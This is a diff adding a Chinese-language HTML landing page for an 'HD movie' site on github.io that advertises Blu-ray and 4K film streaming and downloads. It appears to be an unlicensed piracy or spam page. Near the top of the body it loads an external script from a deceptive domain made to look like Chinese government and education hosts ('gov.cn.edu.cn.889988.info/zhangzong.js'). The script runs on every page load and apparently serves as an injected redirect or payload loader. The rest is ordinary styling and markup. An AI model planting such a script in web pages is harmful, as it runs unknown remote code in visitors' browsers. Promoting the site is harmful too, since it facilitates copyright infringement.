@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="高清电影网, gaoqingdianyingwang-zh, 高清电影, 蓝光电影, 4K在线观看, 电影下载">
+<meta name="description" content="高清电影网 - 提供蓝光、4K高清电影在线观看与下载，收录最新院线大片、经典老片、高分美剧，画质清晰流畅。官方网址：https://gaoqingdianyingwang-zh.github.io">
+<title>高清电影网 | 蓝光 · 4K高清电影在线观看平台</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body {
+    font-family:"Noto Sans CJK SC","PingFang SC","Microsoft YaHei",sans-serif;
+    background:#0a0a0c; color:#e8e8ea; line-height:1.75; -webkit-font-smoothing:antialiased;
+  }
+  a { text-decoration:none; color:inherit; }
+  ul { list-style:none; }
+  ::selection { background:#d4af37; color:#0a0a0c; }
+
+  /* ===== Top bar ===== */
+  .topbar { background:#050506; border-bottom:1px solid #1c1c20; padding:9px 32px; display:flex; justify-content:space-between; align-items:center; font-size:12.5px; color:#8a8a92; }
+  .topbar a { color:#8a8a92; margin-left:20px; transition:color .2s; }
+  .topbar a:hover { color:#d4af37; }
+  .topbar .site-domain { color:#d4af37; font-weight:600; }
+
+  /* ===== Nav ===== */
+  header { position:sticky; top:0; z-index:999; background:rgba(10,10,12,.92); backdrop-filter:blur(12px); border-bottom:1px solid #1c1c20; }
+  .nav { max-width:1240px; margin:0 auto; padding:14px 32px; display:flex; align-items:center; justify-content:space-between; }
+  .brand { display:flex; align-items:center; gap:12px; }
+  .brand-mark { width:38px; height:38px; background:linear-gradient(135deg,#d4af37,#f3e5ab); border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:18px; font-weight:900; color:#0a0a0c; }
+  .brand h1 { font-size:20px; font-weight:800; letter-spacing:1px; }
+  .brand h1 b { color:#d4af37; }
+  .brand span { font-size:11.5px; color:#6b6b73; display:block; letter-spacing:2px; text-transform:uppercase; }
+  .links { display:flex; gap:6px; align-items:center; }
+  .links a { padding:9px 16px; font-size:14px; font-weight:600; color:#c9c9cf; border-radius:6px; transition:all .2s; }
+  .links a:hover { color:#d4af37; }
+  .links a.hot { color:#0a0a0c; background:linear-gradient(135deg,#d4af37,#e8c96a); }
+  .links a.hot:hover { color:#0a0a0c; opacity:.85; }
+  .toggle { display:none; width:34px; height:34px; flex-direction:column; justify-content:center; align-items:center; gap:5px; cursor:pointer; }
+  .toggle i { width:22px; height:2px; background:#d4af37; border-radius:2px; }
+
+  /* ===== Hero ===== */
+  .hero { position:relative; padding:110px 32px 120px; text-align:center; overflow:hidden; background:
+      radial-gradient(ellipse at 50% 0%, rgba(212,175,55,.12), transparent 60%),
+      linear-gradient(180deg,#0d0d10,#0a0a0c); }
+  .hero-glow { position:absolute; top:-120px; left:50%; transform:translateX(-50%); width:700px; height:700px; background:radial-gradient(circle, rgba(212,175,55,.08), transparent 70%); pointer-events:none; }
+  .hero-inner { position:relative; z-index:2; max-width:800px; margin:0 auto; }
+  .kicker { display:inline-block; border:1px solid rgba(212,175,55,.4); color:#d4af37; font-size:12.5px; letter-spacing:3px; padding:6px 18px; border-radius:30px; margin-bottom:26px; text-transform:uppercase; }
+  .hero h2 { font-size:48px; font-weight:900; line-height:1.25; margin-bottom:22px; }
+  .hero h2 i { font-style:normal; background:linear-gradient(135deg,#d4af37,#f9f1d0); -webkit-background-clip:text; background-clip:text; color:transparent; }
+  .hero p { font-size:16.5px; color:#a0a0a8; margin-bottom:38px; max-width:620px; margin-left:auto; margin-right:auto; }
+  .h-acts { display:flex; gap:16px; justify-content:center; flex-wrap:wrap; }
+  .bt { padding:14px 34px; border-radius:8px; font-size:15px; font-weight:700; cursor:pointer; border:none; transition:all .25s; }
+  .bt-gold { background:linear-gradient(135deg,#d4af37,#e8c96a); color:#0a0a0c; }
+  .bt-gold:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(212,175,55,.35); }
+  .bt-line { background:transparent; color:#e8e8ea; border:1px solid #3a3a42; }
+  .bt-line:hover { border-color:#d4af37; color:#d4af37; }
+
+  /* ===== Marquee / badges ===== */
+  .strip { border-top:1px solid #1c1c20; border-bottom:1px solid #1c1c20; padding:22px 32px; background:#0c0c0e; }
+  .strip-in { max-width:1240px; margin:0 auto; display:flex; gap:48px; flex-wrap:wrap; justify-content:center; align-items:center; }
+  .strip span { font-size:13.5px; color:#9a9aa2; display:flex; align-items:center; gap:9px; }
+  .strip span::before { content:'✦'; color:#d4af37; font-size:11px; }
+
+  /* ===== Section ===== */
+  section { padding:88px 32px; }
+  .wrap { max-width:1240px; margin:0 auto; }
+  .s-head { display:flex; align-items:flex-end; justify-content:space-between; margin-bottom:44px; flex-wrap:wrap; gap:14px; }
+  .s-head .tag { font-size:12px; color:#d4af37; letter-spacing:3px; text-transform:uppercase; font-weight:700; }
+  .s-head h3 { font-size:28px; font-weight:900; margin-top:4px; }
+  .s-head p { font-size:14px; color:#8a8a92; margin-top:8px; }
+  .s-head a.all { font-size:13.5px; font-weight:600; color:#d4af37; white-space:nowrap; border-bottom:1px solid transparent; padding-bottom:2px; }
+  .s-head a.all:hover { border-color:#d4af37; }
+
+  /* ===== Film grid ===== */
+  .grid { display:grid; grid-template-columns:repeat(4,1fr); gap:24px; }
+  .film { background:#111114; border:1px solid #1c1c20; border-radius:14px; overflow:hidden; transition:all .35s; position:relative; }
+  .film:hover { border-color:rgba(212,175,55,.5); transform:translateY(-8px); box-shadow:0 18px 40px rgba(0,0,0,.6); }
+  .cover { height:320px; position:relative; padding:16px; display:flex; flex-direction:column; justify-content:space-between; }
+  .cover::after { content:''; position:absolute; inset:0; background:linear-gradient(180deg,transparent 35%,rgba(0,0,0,.82)); }
+  .cov-top, .cov-bot { position:relative; z-index:2; }
+  .cov-top { display:flex; justify-content:space-between; }
+  .tag-q { background:linear-gradient(135deg,#d4af37,#e8c96a); color:#0a0a0c; font-size:11px; font-weight:800; padding:4px 10px; border-radius:4px; }
+  .tag-q.blue { background:linear-gradient(135deg,#4dd0e1,#80deea); }
+  .tag-q.red { background:linear-gradient(135deg,#ff5252,#ff8a80); }
+  .rate { background:rgba(0,0,0,.65); color:#fff; font-size:12.5px; font-weight:700; padding:4px 9px; border-radius:4px; backdrop-filter:blur(4px); }
+  .cov-bot .nm { color:#fff; font-size:20px; font-weight:800; }
+  .cov-bot .yp { font-size:12px; color:#b8b8c0; margin-top:3px; }
+  .f-body { padding:16px 18px 20px; }
+  .f-body .genres { display:flex; gap:7px; flex-wrap:wrap; }
+  .f-body .genres i { font-style:normal; font-size:11.5px; color:#a0a0a8; background:#18181c; padding:3px 10px; border-radius:20px; }
+  .f-body p { font-size:13px; color:#8a8a92; margin-top:12px; }
+
+  .v1{background:linear-gradient(150deg,#1a237e,#4a148c);}
+  .v2{background:linear-gradient(150deg,#263238,#00695c);}
+  .v3{background:linear-gradient(150deg,#bf360c,#f57f17);}
+  .v4{background:linear-gradient(150deg,#212121,#5d4037);}
+  .v5{background:linear-gradient(150deg,#004d40,#1de9b6);}
+  .v6{background:linear-gradient(150deg,#4a148c,#c2185b);}
+  .v7{background:linear-gradient(150deg,#0d47a1,#00bcd4);}
+  .v8{background:linear-gradient(150deg,#3e2723,#ff8f00);}
+
+  /* ===== Quality show ===== */
+  .quality { background:#0c0c0e; }
+  .q-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:0; border:1px solid #1c1c20; border-radius:14px; overflow:hidden; }
+  .q-box { padding:34px 28px; background:#111114; border-right:1px solid #1c1c20; border-bottom:1px solid #1c1c20; transition:background .3s; }
+  .q-box:hover { background:#15151a; }
+  .q-box .lv { font-size:11px; color:#6b6b73; letter-spacing:2px; text-transform:uppercase; }
+  .q-box .nm { font-size:26px; font-weight:900; margin:6px 0 8px; }
+  .q-box .nm.g { color:#d4af37; }
+  .q-box .ds { font-size:13px; color:#8a8a92; }
+
+  /* ===== Channels ===== */
+  .chan-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:22px; }
+  .chan { border:1px solid #1c1c20; border-radius:14px; padding:26px; background:#111114; transition:all .3s; }
+  .chan:hover { border-color:rgba(212,175,55,.45); background:#15151a; }
+  .chan .no { font-size:12px; color:#d4af37; font-weight:800; letter-spacing:2px; }
+  .chan h4 { font-size:19px; margin:8px 0 12px; }
+  .chan ul li { font-size:13.5px; color:#9a9aa2; padding:6px 0; border-bottom:1px dashed #1c1c20; }
+  .chan ul li:last-child { border-bottom:none; }
+  .chan ul li::before { content:'▸'; color:#d4af37; margin-right:8px; }
+
+  /* ===== News ===== */
+  .news { background:#0c0c0e; }
+  .n-wrap { display:grid; grid-template-columns:1.35fr 1fr; gap:28px; }
+  .n-main { border:1px solid #1c1c20; border-radius:14px; overflow:hidden; background:#111114; }
+  .n-main .pic { height:300px; background:linear-gradient(135deg,#1a237e,#b71c1c); display:flex; align-items:center; justify-content:center; font-size:72px; }
+  .n-main .txt { padding:28px; }
+  .n-main .cat { color:#d4af37; font-size:12.5px; font-weight:700; letter-spacing:1px; }
+  .n-main h4 { font-size:22px; margin:10px 0 12px; line-height:1.4; }
+  .n-main p { font-size:14px; color:#8a8a92; }
+  .n-list { display:flex; flex-direction:column; gap:16px; }
+  .n-item { display:flex; gap:16px; border:1px solid #1c1c20; border-radius:12px; padding:16px; background:#111114; transition:all .25s; }
+  .n-item:hover { border-color:rgba(212,175,55,.4); transform:translateX(5px); }
+  .n-thumb { width:110px; height:74px; border-radius:8px; flex-shrink:0; display:flex; align-items:center; justify-content:center; font-size:26px; }
+  .n-item h5 { font-size:15px; margin-bottom:5px; line-height:1.45; }
+  .n-item .dt { font-size:12px; color:#6b6b73; }
+
+  /* ===== Steps / Guide ===== */
+  .guide { }
+  .g-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:24px; }
+  .g-step { text-align:center; padding:30px 20px; border:1px solid #1c1c20; border-radius:14px; background:#111114; position:relative; transition:all .3s; }
+  .g-step:hover { border-color:#d4af37; }
+  .g-step .n { width:44px; height:44px; margin:0 auto 16px; background:linear-gradient(135deg,#d4af37,#e8c96a); color:#0a0a0c; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:18px; font-weight:900; }
+  .g-step h4 { font-size:16.5px; margin-bottom:8px; }
+  .g-step p { font-size:13px; color:#8a8a92; }
+
+  /* ===== Footer links ===== */
+  .flink { background:#070708; border-top:1px solid #1c1c20; }
+  .f-cols { display:grid; grid-template-columns:1.7fr 1fr 1fr 1fr 1fr; gap:32px; }
+  .f-cols .intro h4 { font-size:18px; margin-bottom:14px; }
+  .f-cols .intro h4 b { color:#d4af37; }
+  .f-cols .intro p { font-size:13.5px; color:#8a8a92; }
+  .f-cols .intro .url { color:#d4af37; display:block; margin-top:12px; font-size:13.5px; font-weight:600; }
+  .f-cols .col h5 { color:#d4af37; font-size:14px; margin-bottom:16px; letter-spacing:1px; }
+  .f-cols .col a { display:block; font-size:13.5px; color:#9a9aa2; margin-bottom:10px; transition:color .2s; }
+  .f-cols .col a:hover { color:#d4af37; }
+
+  footer { background:#050506; border-top:1px solid #1c1c20; padding:26px 32px; text-align:center; font-size:12.5px; color:#6b6b73; }
+  footer a { color:#d4af37; }
+
+  /* ===== Responsive ===== */
+  @media(max-width:1000px){
+    .grid { grid-template-columns:1fr 1fr; }
+    .q-grid { grid-template-columns:1fr 1fr; }
+    .chan-grid { grid-template-columns:1fr; }
+    .g-grid { grid-template-columns:1fr 1fr; }
+    .f-cols { grid-template-columns:1fr 1fr; }
+    .n-wrap { grid-template-columns:1fr; }
+    .hero h2 { font-size:34px; }
+  }
+  @media(max-width:600px){
+    .topbar { display:none; }
+    .links { display:none; position:absolute; top:100%; left:0; right:0; flex-direction:column; background:#0a0a0c; padding:16px; border-bottom:1px solid #1c1c20; }
+    .links.open { display:flex; }
+    .toggle { display:flex; }
+    .grid { grid-template-columns:1fr; }
+    .q-grid { grid-template-columns:1fr; }
+    .g-grid { grid-template-columns:1fr; }
+    .f-cols { grid-template-columns:1fr; }
+    section { padding:60px 20px; }
+    .hero { padding:70px 20px 80px; }
+    .n-item { flex-direction:column; }
+    .n-thumb { width:100%; height:90px; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Top bar -->
+<div class="topbar">
+  <span>欢迎访问 <span class="site-domain">gaoqingdianyingwang-zh.github.io</span> · 蓝光 · 4K · 高清电影在线观看</span>
+  <nav><a href="#">RSS订阅</a><a href="#">留言反馈</a><a href="#">免责声明</a><a href="#">合作联系</a></nav>
+</div>
+
+<!-- Nav -->
+<header>
+  <div class="nav">
+    <div class="brand">
+      <div class="brand-mark">HD</div>
+      <div><h1>高清<b>电影网</b></h1><span>HD Movie Network</span></div>
+    </div>
+    <nav class="links" id="links">
+      <a href="#home">首页</a>
+      <a href="#films">电影库</a>
+      <a href="#quality">画质专区</a>
+      <a href="#chan">频道分类</a>
+      <a href="#news">影视资讯</a>
+      <a href="#guide">观看指南</a>
+      <a href="#maplink">网站地图</a>
+      <a href="#" class="hot">立即观看</a>
+    </nav>
+    <div class="toggle" id="toggle"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-glow"></div>
+  <div class="hero-inner">
+    <div class="kicker">★ 极致画质 · 流畅观影 ★</div>
+    <h2>把 <i>影院级画质</i><br>搬到你眼前</h2>
+    <p>高清电影网（gaoqingdianyingwang-zh）专注提供蓝光、4K高清电影在线观看，每日同步最新院线大片与经典高分佳作，画质清晰、播放流畅、中文字幕。</p>
+    <div class="h-acts">
+      <button class="bt bt-gold">最新高清大片</button>
+      <button class="bt bt-line">本周热播榜</button>
+    </div>
+  </div>
+</section>
+
+<!-- Strip -->
+<div class="strip">
+  <div class="strip-in">
+    <span>1080P 蓝光高清</span><span>4K 超清画质</span><span>中文字幕</span>
+    <span>每日更新</span><span>多线路播放</span><span>全端自适应</span>
+  </div>
+</div>
+
+<!-- Films -->
+<section id="films">
+  <div class="wrap">
+    <div class="s-head">
+      <div><span class="tag">FEATURED FILMS</span><h3>高清电影精选</h3><p>院线大片 · 经典佳作 · 高分推荐，按画质与类型随心选</p></div>
+      <a href="#" class="all">浏览全部影片 ›</a>
+    </div>
+    <div class="grid">
+      <div class="film">
+        <div class="cover v1"><div class="cov-top"><span class="tag-q">蓝光</span><span class="rate">★ 9.2</span></div><div class="cov-bot"><div class="nm">奥本海默</div><div class="yp">2023 · 传记/剧情 · 180min</div></div></div>
+        <div class="f-body"><div class="genres"><i>传记</i><i>历史</i><i>IMAX</i></div><p>诺兰执导，原子弹之父的传奇一生，奥斯卡最佳影片。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v2"><div class="cov-top"><span class="tag-q blue">4K</span><span class="rate">★ 8.9</span></div><div class="cov-bot"><div class="nm">沙丘2</div><div class="yp">2024 · 科幻/冒险 · 166min</div></div></div>
+        <div class="f-body"><div class="genres"><i>科幻</i><i>史诗</i><i>视效</i></div><p>保罗·厄崔迪的复仇之路，史诗级科幻视听盛宴。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v3"><div class="cov-top"><span class="tag-q red">热播</span><span class="rate">★ 9.0</span></div><div class="cov-bot"><div class="nm">盗梦空间</div><div class="yp">2010 · 科幻/悬疑 · 148min</div></div></div>
+        <div class="f-body"><div class="genres"><i>悬疑</i><i>烧脑</i><i>经典</i></div><p>诺兰经典烧脑神作，梦境层叠的极致想象。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v4"><div class="cov-top"><span class="tag-q">蓝光</span><span class="rate">★ 8.8</span></div><div class="cov-bot"><div class="nm">阿凡达：水之道</div><div class="yp">2022 · 科幻/冒险 · 192min</div></div></div>
+        <div class="f-body"><div class="genres"><i>科幻</i><i>3D</i><i>视效</i></div><p>潘多拉星球的深海奇缘，划时代视觉巨制。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v5"><div class="cov-top"><span class="tag-q blue">4K</span><span class="rate">★ 9.4</span></div><div class="cov-bot"><div class="nm">肖申克的救赎</div><div class="yp">1994 · 剧情 · 142min</div></div></div>
+        <div class="f-body"><div class="genres"><i>剧情</i><i>经典</i><i>励志</i></div><p>影史评分第一，关于希望与自由的永恒经典。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v6"><div class="cov-top"><span class="tag-q">蓝光</span><span class="rate">★ 8.7</span></div><div class="cov-bot"><div class="nm">蜘蛛侠：纵横宇宙</div><div class="yp">2023 · 动画/冒险 · 140min</div></div></div>
+        <div class="f-body"><div class="genres"><i>动画</i><i>漫改</i><i>视觉</i></div><p>多元宇宙冒险，震撼视觉风格的动画杰作。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v7"><div class="cov-top"><span class="tag-q red">新片</span><span class="rate">★ 8.6</span></div><div class="cov-bot"><div class="nm">星际穿越</div><div class="yp">2014 · 科幻/冒险 · 169min</div></div></div>
+        <div class="f-body"><div class="genres"><i>科幻</i><i>时空</i><i>史诗</i></div><p>黑洞与五维空间的硬核科幻，父女情深动人。</p></div>
+      </div>
+      <div class="film">
+        <div class="cover v8"><div class="cov-top"><span class="tag-q">蓝光</span><span class="rate">★ 9.1</span></div><div class="cov-bot"><div class="nm">教父</div><div class="yp">1972 · 犯罪/剧情 · 175min</div></div></div>
+        <div class="f-body"><div class="genres"><i>犯罪</i><i>经典</i><i>黑帮</i></div><p>黑帮电影巅峰，男人必看的影史经典之作。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Quality -->
+<section class="quality" id="quality">
+  <div class="wrap">
+    <div class="s-head">
+      <div><span class="tag">QUALITY ZONES</span><h3>画质专区</h3><p>四种清晰度随心切换，打造专属观影体验</p></div>
+    </div>
+    <div class="q-grid">
+      <div class="q-box"><div class="lv">STANDARD</div><div class="nm">高清 HD</div><div class="ds">720P 流畅播放，节省流量，随时随地轻松看。</div></div>
+      <div class="q-box"><div class="lv">FULL HD</div><div class="nm g">全高清 1080P</div><div class="ds">蓝光画质，细节清晰，主流设备的首选。</div></div>
+      <div class="q-box"><div class="lv">ULTRA HD</div><div class="nm g">超清 4K</div><div class="ds">极致分辨率，大屏观影如临影院。</div></div>
+      <div class="q-box"><div class="lv">PREMIUM</div><div class="nm">原盘 REMUX</div><div class="ds">无损原盘画质，影音发烧友的终极选择。</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- Channels -->
+<section id="chan">
+  <div class="wrap">
+    <div class="s-head">
+      <div><span class="tag">CHANNELS</span><h3>频道分类</h3><p>按类型精准定位，快速找到想看的影片</p></div>
+      <a href="#" class="all">全部频道 ›</a>
+    </div>
+    <div class="chan-grid">
+      <div class="chan"><span class="no">CH.01</span><h4>动作 / 冒险</h4><ul><li>速度与激情系列</li><li>碟中谍系列</li><li>007 系列</li><li>绝地逃亡</li></ul></div>
+      <div class="chan"><span class="no">CH.02</span><h4>科幻 / 奇幻</h4><ul><li>漫威宇宙系列</li><li>星际科幻大片</li><li>末日灾难片</li><li>异世界奇幻</li></ul></div>
+      <div class="chan"><span class="no">CH.03</span><h4>剧情 / 文艺</h4><ul><li>奥斯卡获奖影片</li><li>文艺独立佳作</li><li>传记史诗</li><li>温情治愈</li></ul></div>
+      <div class="chan"><span class="no">CH.04</span><h4>悬疑 / 犯罪</h4><ul><li>烧脑反转片</li><li>侦探推理</li><li>黑帮犯罪</li><li>心理惊悚</li></ul></div>
+      <div class="chan"><span class="no">CH.05</span><h4>喜剧 / 爱情</h4><ul><li>爆笑喜剧</li><li>浪漫爱情</li><li>青春校园</li><li>合家欢</li></ul></div>
+      <div class="chan"><span class="no">CH.06</span><h4>动画 / 动漫</h4><ul><li>皮克斯动画</li><li>吉卜力经典</li><li>DC/漫威动画</li><li>国产动画</li></ul></div>
+    </div>
+  </div>
+</section>
+
+<!-- News -->
+<section class="news" id="news">
+  <div class="wrap">
+    <div class="s-head">
+      <div><span class="tag">NEWS & UPDATES</span><h3>影视资讯</h3><p>最新上映动态、幕后花絮与观影指南</p></div>
+      <a href="#" class="all">更多资讯 ›</a>
+    </div>
+    <div class="n-wrap">
+      <article class="n-main">
+        <div class="pic">🎞️</div>
+        <div class="txt">
+          <span class="cat">院线动态</span>
+          <h4>2026 年好莱坞大片档期公布，多部续集与重启作定档</h4>
+          <p>从超级英雄到科幻史诗，2026 年好莱坞大片阵容空前强大，多部备受期待的续集与重启作品陆续定档，高清电影网将同步更新高清资源，敬请期待。</p>
+        </div>
+      </article>
+      <div class="n-list">
+        <div class="n-item"><div class="n-thumb v1">📽️</div><div><h5>国产动画电影票房创新高，多部佳作登陆大银幕</h5><div class="dt">2026-01-18</div></div></div>
+        <div class="n-item"><div class="n-thumb v2">🎬</div><div><h5>诺兰新片进入筹备阶段，或将再创视觉奇观</h5><div class="dt">2026-01-15</div></div></div>
+        <div class="n-item"><div class="n-thumb v3">🍿</div><div><h5>春节档影片阵容揭晓，合家欢喜剧成主力</h5><div class="dt">2026-01-10</div></div></div>
+        <div class="n-item"><div class="n-thumb v4">📺</div><div><h5>经典老片 4K 修复版陆续上线，重温影史杰作</h5><div class="dt">2026-01-05</div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Guide -->
+<section id="guide">
+  <div class="wrap">
+    <div class="s-head">
+      <div><span class="tag">HOW TO WATCH</span><h3>观看指南</h3><p>四步开启你的高清观影之旅</p></div>
+    </div>
+    <div class="g-grid">
+      <div class="g-step"><div class="n">1</div><h4>选择影片</h4><p>在电影库或频道分类中，挑选你想观看的高清影片。</p></div>
+      <div class="g-step"><div class="n">2</div><h4>切换画质</h4><p>根据网络与设备，自由切换 720P / 1080P / 4K 清晰度。</p></div>
+      <div class="g-step"><div class="n">3</div><h4>开启字幕</h4><p>支持中文字幕，部分影片提供多语言字幕可选。</p></div>
+      <div class="g-step"><div class="n">4</div><h4>畅快观影</h4><p>多线路智能切换，告别卡顿，享受流畅观影体验。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer links -->
+<section class="flink" id="maplink">
+  <div class="wrap">
+    <div class="s-head">
+      <div><span class="tag">SITE MAP</span><h3>网站地图</h3><p>快速定位你需要的影视内容</p></div>
+    </div>
+    <div class="f-cols">
+      <div class="intro">
+        <h4>高清<b>电影网</b></h4>
+        <p>专注高清电影在线观看，提供蓝光、4K 超清画质资源，涵盖院线大片、经典老片与高分剧集，画质清晰流畅，为影迷打造极致的观影体验。</p>
+        <span class="url">📍 https://gaoqingdianyingwang-zh.github.io</span>
+      </div>
+      <div class="col"><h5>电影类型</h5><a href="#">动作冒险</a><a href="#">科幻奇幻</a><a href="#">悬疑犯罪</a><a href="#">喜剧爱情</a><a href="#">动画动漫</a></div>
+      <div class="col"><h5>画质专区</h5><a href="#">高清 HD</a><a href="#">全高清 1080P</a><a href="#">超清 4K</a><a href="#">原盘 REMUX</a></div>
+      <div class="col"><h5>热门频道</h5><a href="#">最新上映</a><a href="#">高分经典</a><a href="#">华语电影</a><a href="#">欧美大片</a></div>
+      <div class="col"><h5>关于本站</h5><a href="#">关于我们</a><a href="#">留言反馈</a><a href="#">免责声明</a><a href="#">合作联系</a></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  © 2025 高清电影网（gaoqingdianyingwang-zh）· 官方网址：<a href="https://gaoqingdianyingwang-zh.github.io">https://gaoqingdianyingwang-zh.github.io</a> · 本站内容仅供学习交流，版权归原作者及发行方所有
+</footer>
+
+<script>
+  document.getElementById('toggle').addEventListener('click',function(){
+    document.getElementById('links').classList.toggle('open');
+  });
+  document.querySelectorAll('#links a').forEach(function(a){
+    a.addEventListener('click',function(){ document.getElementById('links').classList.remove('open'); });
+  });
+</script>
+
+</body>
+</html>
